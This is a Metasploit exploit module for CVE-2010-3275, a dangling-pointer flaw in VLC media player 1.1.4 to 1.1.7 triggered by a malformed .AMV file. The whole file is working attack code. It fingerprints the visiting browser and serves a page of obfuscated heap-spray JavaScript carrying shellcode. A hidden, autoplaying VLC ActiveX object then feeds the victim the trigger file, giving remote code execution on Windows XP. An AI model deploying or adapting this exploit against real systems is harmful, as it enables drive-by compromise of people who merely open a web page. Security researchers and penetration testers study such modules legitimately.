# $Id: vlc_amv.rb 12140 2011-03-26 00:07:36Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => "VLC AMV Dangling Pointer Vulnerability",
            &#039;Description&#039; => %q{
                This module exploits VLC media player when handling a .AMV file. By flipping the 0x41st
                byte in the file format (video width/height), VLC crashes due to an invalid pointer, which
                allows remote attackers to gain arbitrary code execution.
                 
                The vulnerable packages include:
                VLC 1.1.4
                VLC 1.1.5
                VLC 1.1.6
                VLC 1.1.7
                },
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Version&#039;     => "$Revision: 12140 $",
            &#039;Author&#039;      =>
                [
                    &#039;sinn3r&#039;,
                ],
            &#039;References&#039; =>
                [
                    [&#039;CVE&#039;, &#039;CVE-2010-3275&#039;],
                    [&#039;URL&#039;, &#039;http://www.coresecurity.com/content/vlc-vulnerabilities-amv-nsv-files&#039;],
                ],
            &#039;Payload&#039; =>
                {
                    &#039;BadChars&#039;        => "\x00",
                    &#039;space&#039;           => 1000,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => "process",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;  =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [ &#039;Windows XP SP3 IE6&#039;, {&#039;Ret&#039;=>0x0c0c0c0c} ],
                    [ &#039;Windows XP SP3 IE7&#039;, {&#039;Ret&#039;=>0x1c1c1c1c} ],
                ],
            &#039;DisclosureDate&#039; => "Mar 23 2011",
            &#039;DefaultTarget&#039; => 0))
 
    end
 
    def getRet(cli, request)
        if target.name == &#039;Automatic&#039;
 
            agent = request.headers[&#039;User-Agent&#039;]
 
            case agent
            when /MSIE 6\.0/
                return [0x0c0c0c0c].pack(&#039;V&#039;) * 8
            when /MSIE 7\.0/
                return [0x1c1c1c1c].pack(&#039;V&#039;) * 8
            when /^vlc/
                #VLC identifies itself as "VLC" when requesting our trigger file
                return ""
            when /^NSPlayer/
                #NSPlayer is also used while requesting the trigger file
                return ""
            else
                return nil
            end
 
        else
 
            #User manually specified a target
            return [target.ret].pack(&#039;V&#039;) * 8
 
        end
    end
 
    def exploit
        path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2010-3275.amv")
        f = File.open(path, "rb")
        @trigger = f.read
        f.close
 
        super
    end
 
    def on_request_uri(cli, request)
 
        #Determine if client is a potential victim either manually or automatically,
        #and then return the appropriate EIP
        nops = getRet(cli, request)
        if nops == nil
            send_not_found(cli)
            return
        end
 
        if request.uri.match(/\.amv/)
            print_status("Sending trigger file to #{cli.peerhost}:#{cli.peerport}")
            send_response(cli, @trigger, { &#039;Content-Type&#039; => &#039;text/plain&#039; } )
            return
        end
 
        nopsled   = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
 
        js_func_name             = rand_text_alpha(rand(6) + 3)
        js_var_blocks_name       = rand_text_alpha(rand(6) + 3)
        js_var_shell_name        = rand_text_alpha(rand(6) + 3)
        js_var_nopsled_name      = rand_text_alpha(rand(6) + 3)
        js_var_index_name        = rand_text_alpha(rand(6) + 3)
        trigger_file             = datastore[&#039;URIPATH&#039;] + "/" + rand_text_alpha(rand(6) + 3) + ".amv"
 
        html = <<-EOS
        <html>
        <head>
        <script>
        function #{js_func_name}() {
            var #{js_var_blocks_name} = new Array();
            var #{js_var_shell_name} = unescape("#{shellcode}");
            var #{js_var_nopsled_name} = unescape("#{nopsled}");
            do { #{js_var_nopsled_name} += #{js_var_nopsled_name} } while (#{js_var_nopsled_name}.length < 82000);
            for (#{js_var_index_name}=0; #{js_var_index_name} < 3500; #{js_var_index_name}++) {
                #{js_var_blocks_name}[#{js_var_index_name}] = #{js_var_nopsled_name} + #{js_var_shell_name};
            }
        }
        #{js_func_name}();
        </script>
        </head>
        <body>
        <object classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
                codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
                width="0" height="0"
                events="True">
        <param name="Src" value="#{trigger_file}"></param>
        <param name="ShowDisplay" value="False" ></param>
        <param name="AutoLoop" value="no"></param>
        <param name="AutoPlay" value="yes"></param>
        </object>
        </body>
        </html>
        EOS
 
        #Remove extra tabs in HTML
        html = html.gsub(/^\t\t/, "")
 
        print_status("Sending malicious page to #{cli.peerhost}:#{cli.peerport}...")
        send_response( cli, html, {&#039;Content-Type&#039; => &#039;text/html&#039;} )
    end
end



